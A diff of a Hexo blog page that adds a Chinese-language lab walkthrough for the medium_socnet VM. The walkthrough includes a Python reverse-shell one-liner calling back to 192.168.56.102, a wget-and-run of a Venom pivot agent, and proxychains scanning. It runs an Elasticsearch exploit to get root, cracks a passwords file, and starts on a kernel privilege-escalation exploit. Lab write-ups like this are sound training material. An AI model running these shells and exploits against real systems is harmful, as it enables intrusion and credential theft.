@@ -6,7 +6,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width,inital-scale=1,user-scalable=no">
-  <title>Tag: PHP [ Hexo ]</title>
+  <title>medium_socnet.ova靶机笔记 [ Hexo ]</title>
   <!-- bootstrapcss文件 -->
  <!--  <link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"> -->
 <!--   
@@ -81,33 +81,90 @@
     </div>
     <div id="content-right" class="col-md-8">
     
-<div id="tag">
-  <h2>标签：PHP</h2>
-  
-           
-        <a href="/2023/08/20/PHP%E6%8E%A7%E5%88%B6%E8%AF%AD%E5%8F%A5/" taget="_blank" class="tag-item">
-        <span>
-          PHP控制语句
-        </span>
-        <time datetime="2023-08-20T15:13:23.919Z">
-          2023-08-20
-        </time>
-        </a>
-      
-  
-           
-        <a href="/2023/07/29/PHP/" taget="_blank" class="tag-item">
-        <span>
-          PHP
-        </span>
-        <time datetime="2023-07-29T14:51:12.905Z">
-          2023-07-29
-        </time>
-        </a>
-      
-  
-  
-</div>
+<article id="post">
+	<div class="post-title">
+  <h1>medium_socnet.ova靶机笔记</h1>
+  	</div>
+  <div class="page-meta">
+  	<span class="fa-wrap">
+  		<i class="fa fa-clock-o"></i>
+  		<span class="date-meta">2023-09-21</span>
+  	</span>
+  	<span class="fa-wrap">
+  		
+  		<i class="fa fa-tags"></i>
+  		<span class="tags-meta">靶机笔记</span>
+  		
+  	</span>
+  	<span class="fa-wrap">
+  		
+  	</span>
+  </div>
+  <div class="post-content">
+  <ol>
+<li></li>
+</ol>
+<p>import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.56.102”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([“&#x2F;bin&#x2F;bash”,”-i”]);</p>
+<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212151310" alt="img"></p>
+<p>nc -lvp 1234</p>
+<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212152936" alt="img"></p>
+<p>在Kali主机Venom目录启动Python3 Http Server</p>
+<p><strong>python3 -m http.server 80</strong></p>
+<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212152069" alt="img"></p>
+<p>cd &#x2F;tmp</p>
+<p>wget -c <a target="_blank" rel="noopener" href="http://192.168.56.102/agent_linux_x64">http://192.168.56.102/agent_linux_x64</a></p>
+<p>ls</p>
+<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212152378" alt="img"></p>
+<p>chmod +x agent_linux_x64</p>
+<p>.&#x2F;agent_linux_x64 -rhost 192.168.56.102 -rport 9999</p>
+<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212152270" alt="img"></p>
+<p>.&#x2F;admin_linux_x64 -lport 9999 &#x2F;&#x2F;启动Venom管理端，监听本地9999端口</p>
+<ul>
+<li>show</li>
+<li>goto 1</li>
+<li>socks 7777</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212152863" alt="img"></p>
+<p>vi &#x2F;etc&#x2F;proxychains4.conf</p>
+<p>修改最后一行为：</p>
+<p>socks5 127.0.0.1 7777</p>
+<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212152982" alt="img"></p>
+<p><strong>挂代理启动扫描，发现172.17.0.1<strong><strong>，172.17.0.2</strong></strong>相同，172.17.0.2<strong><strong>存在9200</strong></strong>端口</strong></p>
+<p><strong>proxychains nmap -Pn -sT -sV 172.17.0.2</strong></p>
+<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212152906" alt="img"></p>
+<p>searchsploit Elasticsearch &#x2F;&#x2F;搜索Elasticsearch漏洞</p>
+<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212152893" alt="img"></p>
+<p>复制36337.py到当前目录，通过查看该python脚本得知该使用python2</p>
+<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212152800" alt="img"></p>
+<p>向Elasticsearch写入一条数据（如果不写入数据，攻击代码无法执行）</p>
+<p><strong>proxychains curl -XPOST ‘172.17.0.2:9200&#x2F;twitter&#x2F;user&#x2F;yren’ -d ‘{“name”:”Sun”}’</strong></p>
+<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212153168" alt="img"></p>
+<p><strong>proxychains python2 36337.py 172.17.0.2</strong>  &#x2F;&#x2F;挂proxychains攻击172.17.0.2 9200端口</p>
+<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212153759" alt="img"></p>
+<p><strong>查询用户身份,发现是root权限</strong></p>
+<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212153819" alt="img"></p>
+<p>在根目录下发现passwords文件，内含用户名一些用户名和密码</p>
+<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212153892" alt="img"></p>
+<p><strong>cat passwords</strong> &#x2F;&#x2F;查看密码并使用md5网站解密</p>
+<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212153848" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212153103" alt="img"></p>
+<p><strong>ssh</strong> <a href="mailto:john@192.168.56.101"><strong>john@192.168.56.101</strong></a> (靶机ip)</p>
+<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212153969" alt="img"></p>
+<p>尝试john用户提权，但提权失败</p>
+<p>sudo -s   &#x2F;&#x2F;约等于sudo su</p>
+<p>尝试内核提权</p>
+<p>uname -a </p>
+<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212153933" alt="img"></p>
+<p>cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;37292.c .</p>
+<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212153347" alt="img"></p>
+<p>vim 37292.c</p>
+<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212153117" alt="img"></p>
+<p>注释掉37292.c的139-147行</p>
+<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202309212153439" alt="img"></p>
+
+	</div>
+</article>
+
 
 
     </div>
